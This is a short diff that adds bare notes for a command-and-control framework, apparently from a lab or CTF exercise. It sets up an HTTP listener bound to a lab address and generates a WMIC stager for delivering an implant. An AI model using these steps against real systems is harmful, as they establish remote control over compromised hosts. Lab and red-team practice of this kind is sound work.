@@ -1,0 +1,13 @@
+
+set/start Listener:
+Listeners
+use http
+set BINDIP 10.10.14.7
+start
+
+Generate Stager:
+stagers
+use wmic
+generate http
+
+
